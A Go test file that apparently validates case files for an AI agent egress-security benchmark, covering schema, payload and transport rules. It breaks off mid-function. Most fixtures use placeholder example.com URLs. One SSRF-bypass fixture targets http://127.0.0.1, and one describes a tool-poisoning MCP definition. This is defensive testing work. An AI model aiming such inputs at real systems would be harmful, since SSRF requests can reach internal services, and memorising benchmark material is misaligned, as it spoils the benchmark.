package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strconv"
	"strings"
	"testing"

	capabilityregistry "github.com/luckyPipewrench/agent-egress-bench/capability-registry"
)

var testRegistryReference = capabilityregistry.Reference{ID: "aeb.core-capabilities", Format: 1, Revision: 1, SHA256: "f5ae9fa9cbb79e8539d50f0284e584eb6ea834232e801d3e1c269411a9527e9b"}

type readerContract struct {
	Consumer         string `json:"consumer"`
	Role             string `json:"role"`
	Path             string `json:"path"`
	AcceptedVersions []int  `json:"accepted_versions"`
}

func toolProfileReaderContract(t *testing.T, consumer string) readerContract {
	t.Helper()
	data, err := os.ReadFile(filepath.Join("..", "contracts", "artifacts.json"))
	if err != nil {
		t.Fatalf("read compatibility manifest: %v", err)
	}
	var manifest struct {
		ArtifactFamilies []struct {
			Family          string           `json:"family"`
			ReaderContracts []readerContract `json:"reader_contracts"`
		} `json:"artifact_families"`
	}
	if err := json.Unmarshal(data, &manifest); err != nil {
		t.Fatalf("decode compatibility manifest: %v", err)
	}
	for _, family := range manifest.ArtifactFamilies {
		if family.Family != "tool_profile" {
			continue
		}
		for _, contract := range family.ReaderContracts {
			if contract.Consumer == consumer {
				return contract
			}
		}
	}
	t.Fatalf("compatibility manifest has no tool_profile reader contract for %q", consumer)
	return readerContract{}
}

// writeCase writes a JSON case file and returns the path.
func writeCase(t *testing.T, dir, subdir, filename, content string) string {
	t.Helper()
	casedir := filepath.Join(dir, subdir)
	if err := os.MkdirAll(casedir, 0o750); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(casedir, filename)
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestValidCase(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-test-001.json", `{
		"schema_version": 4,
		"id": "url-test-001",
		"category": "url",
		"title": "Test URL case",
		"description": "Valid URL test case",
		"input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com/test"},
		"expected_verdict": "block",
		"severity": "high",
		"capability_tags": ["url_dlp"],
		"requires": [],
		"false_positive_risk": "low",
		"why_expected": "test_reason",
		"notes": "",
		"source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-test-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors, got: %v", errors)
	}
}

func TestValidBenignCase(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-benign-001.json", `{
		"schema_version": 4,
		"id": "url-benign-001",
		"category": "url",
		"title": "Benign URL case",
		"description": "Valid benign URL test case",
		"input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://api.example.com/data"},
		"expected_verdict": "allow",
		"severity": "low",
		"capability_tags": ["benign"],
		"requires": [],
		"false_positive_risk": "low",
		"why_expected": "normal_api_call",
		"safe_example": true,
		"notes": "",
		"source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-benign-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors, got: %v", errors)
	}
}

func TestMissingPayloadFields(t *testing.T) {
	tests := []struct {
		name      string
		subdir    string
		filename  string
		json      string
		wantError string
	}{
		{
			name:     "header case missing payload.headers",
			subdir:   "headers",
			filename: "header-test-001.json",
			json: `{
				"schema_version": 4, "id": "header-test-001", "category": "headers",
				"title": "T", "description": "D", "input_type": "header",
				"transport": "fetch_proxy",
				"payload": {"method": "GET", "url": "https://example.com"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["header_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: `payload missing required key "headers"`,
		},
		{
			name:     "url case missing payload.url",
			subdir:   "url",
			filename: "url-test-001.json",
			json: `{
				"schema_version": 4, "id": "url-test-001", "category": "url",
				"title": "T", "description": "D", "input_type": "url",
				"transport": "fetch_proxy",
				"payload": {"method": "GET"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["url_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: `payload missing required key "url"`,
		},
		{
			name:     "request_body case missing payload.body",
			subdir:   "request-body",
			filename: "body-test-001.json",
			json: `{
				"schema_version": 4, "id": "body-test-001", "category": "request_body",
				"title": "T", "description": "D", "input_type": "request_body",
				"transport": "fetch_proxy",
				"payload": {"method": "POST", "url": "https://example.com", "content_type": "application/json"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["request_body_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: `payload missing required key "body"`,
		},
		{
			name:     "response case missing payload.response_body",
			subdir:   "response-fetch",
			filename: "response-test-001.json",
			json: `{
				"schema_version": 4, "id": "response-test-001", "category": "response_fetch",
				"title": "T", "description": "D", "input_type": "response_content",
				"transport": "fetch_proxy",
				"payload": {"url": "https://example.com"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["response_injection"], "requires": ["response_prompt_injection_scanning"],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: `payload missing required key "response_body"`,
		},
		{
			name:     "MCP case missing payload.jsonrpc_messages",
			subdir:   "mcp-input",
			filename: "mcp-test-001.json",
			json: `{
				"schema_version": 4, "id": "mcp-test-001", "category": "mcp_input",
				"title": "T", "description": "D", "input_type": "mcp_tool_call",
				"transport": "mcp_stdio",
				"payload": {"something": "else"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["mcp_input_scan"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: `payload missing required key "jsonrpc_messages"`,
		},
		{
			name:     "MCP case with empty jsonrpc_messages array",
			subdir:   "mcp-input",
			filename: "mcp-test-002.json",
			json: `{
				"schema_version": 4, "id": "mcp-test-002", "category": "mcp_input",
				"title": "T", "description": "D", "input_type": "mcp_tool_call",
				"transport": "mcp_stdio",
				"payload": {"jsonrpc_messages": []},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["mcp_input_scan"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: `payload.jsonrpc_messages must not be empty`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			writeCase(t, dir, tt.subdir, tt.filename, tt.json)
			ids := make(map[string]string)
			path := filepath.Join(dir, tt.subdir, tt.filename)
			errors := validateFile(path, ids)
			if len(errors) == 0 {
				t.Fatal("expected validation error, got none")
			}
			found := false
			for _, e := range errors {
				if containsStr(e, tt.wantError) {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("expected error containing %q, got: %v", tt.wantError, errors)
			}
		})
	}
}

func TestCategoryInputTypeMismatch(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-tool", "mcp-bad-001.json", `{
		"schema_version": 4, "id": "mcp-bad-001", "category": "mcp_tool",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_tool_poison"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-tool", "mcp-bad-001.json")
	errors := validateFile(path, ids)

	wantInputErr := `category "mcp_tool" does not allow input_type "url"`
	wantTransportErr := `category "mcp_tool" does not allow transport "fetch_proxy"`

	if len(errors) < 2 {
		t.Fatalf("expected at least 2 errors, got %d: %v", len(errors), errors)
	}
	if !containsStr(errors[0], wantInputErr) && !containsStr(errors[1], wantInputErr) {
		t.Errorf("expected error containing %q, got: %v", wantInputErr, errors)
	}
	if !containsStr(errors[0], wantTransportErr) && !containsStr(errors[1], wantTransportErr) {
		t.Errorf("expected error containing %q, got: %v", wantTransportErr, errors)
	}
}

func TestBenignCaseMissingSafeExample(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-benign-bad-001.json", `{
		"schema_version": 4, "id": "url-benign-bad-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "allow", "severity": "low",
		"capability_tags": ["benign"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-benign-bad-001.json")
	errors := validateFile(path, ids)
	if len(errors) == 0 {
		t.Fatal("expected error for missing safe_example, got none")
	}
	found := false
	for _, e := range errors {
		if containsStr(e, "safe_example") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected error about safe_example, got: %v", errors)
	}
}

func TestGauntletCategoryRequiresSource(t *testing.T) {
	dir := t.TempDir()
	// Gauntlet category (ssrf_bypass) with empty source should fail.
	writeCase(t, dir, "ssrf-bypass", "ssrf-test-001.json", `{
		"schema_version": 4, "id": "ssrf-test-001", "category": "ssrf_bypass",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "http://127.0.0.1"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["ssrf_bypass"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "test", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "ssrf-bypass", "ssrf-test-001.json")
	errors := validateFile(path, ids)
	found := false
	for _, e := range errors {
		if strings.Contains(e, "non-empty source") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected source enforcement error for gauntlet category, got: %v", errors)
	}
}

func TestGauntletCategoryWithSourcePasses(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "ssrf-bypass", "ssrf-test-002.json", `{
		"schema_version": 4, "id": "ssrf-test-002", "category": "ssrf_bypass",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "http://127.0.0.1"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["ssrf_bypass"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "test", "source": "original"
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "ssrf-bypass", "ssrf-test-002.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors for gauntlet case with source, got: %v", errors)
	}
}

func TestDuplicateID(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-dup-001.json", `{
		"schema_version": 4, "id": "url-dup-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := map[string]string{"url-dup-001": "some/other/path.json"}
	path := filepath.Join(dir, "url", "url-dup-001.json")
	errors := validateFile(path, ids)
	found := false
	for _, e := range errors {
		if containsStr(e, "duplicate id") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected duplicate ID error, got: %v", errors)
	}
}

func TestIDFilenameMismatch(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "wrong-name.json", `{
		"schema_version": 4, "id": "url-test-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "wrong-name.json")
	errors := validateFile(path, ids)
	found := false
	for _, e := range errors {
		if containsStr(e, "does not match filename") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected filename mismatch error, got: %v", errors)
	}
}

func TestPayloadHeadersMustBeObject(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "headers", "header-bad-001.json", `{
		"schema_version": 4, "id": "header-bad-001", "category": "headers",
		"title": "T", "description": "D", "input_type": "header",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com", "headers": "not-an-object"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["header_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "headers", "header-bad-001.json")
	errors := validateFile(path, ids)
	found := false
	for _, e := range errors {
		if containsStr(e, "payload.headers must be an object") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected object type error, got: %v", errors)
	}
}

func TestWebsocketTransportAllowedForHTTPCategories(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-ws-001.json", `{
		"schema_version": 4, "id": "url-ws-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "websocket",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-ws-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("websocket should be valid for url category, got errors: %v", errors)
	}
}

func TestWebsocketTransportRejectedForMCPCategories(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-input", "mcp-ws-001.json", `{
		"schema_version": 4, "id": "mcp-ws-001", "category": "mcp_input",
		"title": "T", "description": "D", "input_type": "mcp_tool_call",
		"transport": "websocket",
		"payload": {"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_input_scan"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-input", "mcp-ws-001.json")
	errors := validateFile(path, ids)
	found := false
	for _, e := range errors {
		if containsStr(e, `does not allow transport "websocket"`) {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected transport rejection for mcp_input+websocket, got: %v", errors)
	}
}

func TestMITMOnlyAllowsHTTPProxy(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "response-mitm", "response-mitm-bad-001.json", `{
		"schema_version": 4, "id": "response-mitm-bad-001", "category": "response_mitm",
		"title": "T", "description": "D", "input_type": "response_content",
		"transport": "fetch_proxy",
		"payload": {"url": "https://example.com", "response_body": "test"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["response_injection"], "requires": ["response_prompt_injection_scanning"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "response-mitm", "response-mitm-bad-001.json")
	errors := validateFile(path, ids)
	found := false
	for _, e := range errors {
		if containsStr(e, `does not allow transport "fetch_proxy"`) {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected transport rejection for response_mitm+fetch_proxy, got: %v", errors)
	}
}

func TestCLIRequiresArgument(t *testing.T) {
	// Build the validator binary
	binPath := filepath.Join(t.TempDir(), "validate")
	build := exec.Command("go", "build", "-o", binPath, ".")
	build.Dir = "."
	if out, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build failed: %v\n%s", err, out)
	}

	// Run with no arguments
	cmd := exec.Command(binPath)
	output, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatal("expected non-zero exit code with no arguments")
	}
	if !containsStr(string(output), "usage:") {
		t.Errorf("expected usage message, got: %s", output)
	}
}

func TestInvalidSchemaVersion(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-ver-001.json", `{
		"schema_version": 1,
		"id": "url-ver-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-ver-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "schema_version must be 4")
}

func TestInvalidJSON(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-bad-json-001.json", `{not valid json}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-bad-json-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "JSON parse error")
}

func TestMissingRequiredStringFields(t *testing.T) {
	tests := []struct {
		name      string
		json      string
		wantError string
	}{
		{
			name: "missing title",
			json: `{
				"schema_version": 4, "id": "url-notitle-001", "category": "url",
				"title": "", "description": "D", "input_type": "url",
				"transport": "fetch_proxy",
				"payload": {"method": "GET", "url": "https://example.com"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["url_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: "missing title",
		},
		{
			name: "missing description",
			json: `{
				"schema_version": 4, "id": "url-nodesc-001", "category": "url",
				"title": "T", "description": "", "input_type": "url",
				"transport": "fetch_proxy",
				"payload": {"method": "GET", "url": "https://example.com"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["url_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: "missing description",
		},
		{
			name: "missing id",
			json: `{
				"schema_version": 4, "id": "", "category": "url",
				"title": "T", "description": "D", "input_type": "url",
				"transport": "fetch_proxy",
				"payload": {"method": "GET", "url": "https://example.com"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["url_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: "missing id",
		},
		{
			name: "missing why_expected",
			json: `{
				"schema_version": 4, "id": "url-nowhy-001", "category": "url",
				"title": "T", "description": "D", "input_type": "url",
				"transport": "fetch_proxy",
				"payload": {"method": "GET", "url": "https://example.com"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["url_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "",
				"notes": "", "source": ""
			}`,
			wantError: "missing why_expected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			// Use a filename that matches the id when present
			fname := "url-test-001.json"
			writeCase(t, dir, "url", fname, tt.json)
			ids := make(map[string]string)
			path := filepath.Join(dir, "url", fname)
			errors := validateFile(path, ids)
			assertContainsError(t, errors, tt.wantError)
		})
	}
}

func TestInvalidEnumValues(t *testing.T) {
	baseJSON := func(field, value string) string {
		category := "url"
		inputType := "url"
		transport := "fetch_proxy"
		verdict := "block"
		severity := "high"
		fpRisk := "low"
		capTags := `["url_dlp"]`

		switch field {
		case "category":
			category = value
		case "input_type":
			inputType = value
		case "transport":
			transport = value
		case "expected_verdict":
			verdict = value
		case "severity":
			severity = value
		case "false_positive_risk":
			fpRisk = value
		case "capability_tags":
			capTags = value
		case "requires":
			return fmt.Sprintf(`{
				"schema_version": 4, "id": "url-enum-001", "category": "url",
				"title": "T", "description": "D", "input_type": "url",
				"transport": "fetch_proxy",
				"payload": {"method": "GET", "url": "https://example.com"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["url_dlp"], "requires": [%s],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`, value)
		}

		return fmt.Sprintf(`{
			"schema_version": 4, "id": "url-enum-001", "category": "%s",
			"title": "T", "description": "D", "input_type": "%s",
			"transport": "%s",
			"payload": {"method": "GET", "url": "https://example.com"},
			"expected_verdict": "%s", "severity": "%s",
			"capability_tags": %s, "requires": [],
			"false_positive_risk": "%s", "why_expected": "test",
			"notes": "", "source": ""
		}`, category, inputType, transport, verdict, severity, capTags, fpRisk)
	}

	tests := []struct {
		name      string
		field     string
		value     string
		wantError string
	}{
		{"invalid category", "category", "invalid_cat", `invalid category: "invalid_cat"`},
		{"invalid input_type", "input_type", "magic", `invalid input_type: "magic"`},
		{"invalid transport", "transport", "carrier_pigeon", `invalid transport: "carrier_pigeon"`},
		{"invalid verdict", "expected_verdict", "maybe", `invalid expected_verdict: "maybe"`},
		{"invalid severity info", "severity", "info", `invalid severity: "info"`},
		{"invalid severity warning", "severity", "warning", `invalid severity: "warning"`},
		{"invalid fp_risk", "false_positive_risk", "extreme", `invalid false_positive_risk: "extreme"`},
		{"invalid requires", "requires", `"not_a_req"`, `invalid requires value: "not_a_req"`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			writeCase(t, dir, "url", "url-enum-001.json", baseJSON(tt.field, tt.value))
			ids := make(map[string]string)
			path := filepath.Join(dir, "url", "url-enum-001.json")
			errors := validateFile(path, ids)
			assertContainsError(t, errors, tt.wantError)
		})
	}
	t.Run("schema v4 warn remains accepted", func(t *testing.T) {
		dir := t.TempDir()
		writeCase(t, dir, "url", "url-enum-001.json", baseJSON("expected_verdict", "warn"))
		errors := validateFile(filepath.Join(dir, "url", "url-enum-001.json"), make(map[string]string))
		for _, issue := range errors {
			if strings.Contains(issue, "expected_verdict") {
				t.Fatalf("schema-v4 warn rejected: %v", errors)
			}
		}
	})
}

func TestUnknownCapabilityTagDefersToPinnedRegistry(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-registry-tag-001.json", `{
		"schema_version": 4, "id": "url-registry-tag-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url", "transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"}, "expected_verdict": "block",
		"severity": "high", "capability_tags": ["future_registry_tag"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test", "notes": "", "source": ""
	}`)
	if errors := validateFile(filepath.Join(dir, "url", "url-registry-tag-001.json"), map[string]string{}); len(errors) != 0 {
		t.Fatalf("structural case validation should defer labels to a run's pinned registry: %v", errors)
	}
}

func TestEmptyCapabilityTags(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-notags-001.json", `{
		"schema_version": 4, "id": "url-notags-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": [], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-notags-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "capability_tags must not be empty")
}

func TestCategoryDirectoryMismatch(t *testing.T) {
	dir := t.TempDir()
	// Put a URL case in the headers directory
	writeCase(t, dir, "headers", "url-wrongdir-001.json", `{
		"schema_version": 4, "id": "url-wrongdir-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "headers", "url-wrongdir-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, `expects directory "url"`)
}

func TestMissingPayload(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-nopay-001.json", `{
		"schema_version": 4, "id": "url-nopay-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-nopay-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "missing payload")
}

func TestPayloadMethodMustBeString(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-badmethod-001.json", `{
		"schema_version": 4, "id": "url-badmethod-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": 42, "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-badmethod-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "payload.method must be a string")
}

func TestMCPToolResultPayload(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-tool", "mcp-tool-valid-001.json", `{
		"schema_version": 4, "id": "mcp-tool-valid-001", "category": "mcp_tool",
		"title": "T", "description": "D", "input_type": "mcp_tool_result",
		"transport": "mcp_stdio",
		"payload": {"jsonrpc_messages": [{"jsonrpc": "2.0", "result": {"content": [{"type": "text", "text": "test"}]}, "id": 1}]},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_tool_poison"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-tool", "mcp-tool-valid-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors for mcp_tool_result, got: %v", errors)
	}
}

func TestMCPToolDefinitionPayload(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-tool", "mcp-tool-def-001.json", `{
		"schema_version": 4, "id": "mcp-tool-def-001", "category": "mcp_tool",
		"title": "T", "description": "D", "input_type": "mcp_tool_definition",
		"transport": "mcp_http",
		"payload": {"jsonrpc_messages": [{"jsonrpc": "2.0", "result": {"tools": [{"name": "evil", "description": "do bad things"}]}, "id": 1}]},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_tool_poison"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-tool", "mcp-tool-def-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors for mcp_tool_definition, got: %v", errors)
	}
}

func TestMCPInitializeResponsePayloadRequiresInitializeWireContract(t *testing.T) {
	valid := map[string]interface{}{"jsonrpc_messages": []interface{}{
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "clientInfo": map[string]interface{}{"name": "test-client", "version": "1.0.0"}}},
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "result": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "serverInfo": map[string]interface{}{"name": "test-server", "version": "1.0.0"}, "instructions": "Use the catalog."}},
	}}
	if errors := validatePayload("mcp_initialize_response", valid); len(errors) != 0 {
		t.Fatalf("valid initialize response errors = %v", errors)
	}

	withoutInstructions := map[string]interface{}{"jsonrpc_messages": []interface{}{
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "clientInfo": map[string]interface{}{"name": "test-client", "version": "1.0.0"}}},
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "result": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "serverInfo": map[string]interface{}{"name": "test-server", "version": "1.0.0"}}},
	}}
	if errors := validatePayload("mcp_initialize_response", withoutInstructions); len(errors) != 0 {
		t.Fatalf("initialize response without optional instructions errors = %v", errors)
	}

	withInvalidInstructions := map[string]interface{}{"jsonrpc_messages": []interface{}{
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "clientInfo": map[string]interface{}{"name": "test-client", "version": "1.0.0"}}},
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "result": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "serverInfo": map[string]interface{}{"name": "test-server", "version": "1.0.0"}, "instructions": true}},
	}}
	assertContainsError(t, validatePayload("mcp_initialize_response", withInvalidInstructions), "instructions must be a string when present")

	withResultAndError := map[string]interface{}{"jsonrpc_messages": []interface{}{
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "clientInfo": map[string]interface{}{"name": "test-client", "version": "1.0.0"}}},
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "result": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "serverInfo": map[string]interface{}{"name": "test-server", "version": "1.0.0"}}, "error": map[string]interface{}{"code": -32603, "message": "failure"}},
	}}
	assertContainsError(t, validatePayload("mcp_initialize_response", withResultAndError), "must not contain both result and error")

	wrongMethod := map[string]interface{}{"jsonrpc_messages": []interface{}{
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "method": "tools/list"},
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "result": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "serverInfo": map[string]interface{}{}, "instructions": "Use the catalog."}},
	}}
